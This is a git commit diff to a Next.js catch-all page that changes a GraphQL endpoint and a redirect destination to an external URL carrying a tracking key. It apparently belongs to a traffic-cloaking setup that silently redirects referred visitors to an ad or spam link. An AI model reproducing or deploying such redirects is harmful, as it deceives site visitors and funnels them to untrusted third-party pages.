c871cf565d9ea2f858ee35e4572a70140c0e66ee
nbahmad024 <134704763+nbahmad024@users.noreply.github.com>
2023-06-14 22:19:05 +0500

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = "https://getoffready.000webhostapp.com/after-everything-5-2023"
+	const endpoint = "https://awarecatching.com/naeh6vvub?key=1826521bcaa73852bad0ee428828ab4f"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://getoffready.000webhostapp.com/after-everything-5-2023` 
+					`https://awarecatching.com/naeh6vvub?key=1826521bcaa73852bad0ee428828ab4f` 
 				}`,
 			},
 		};
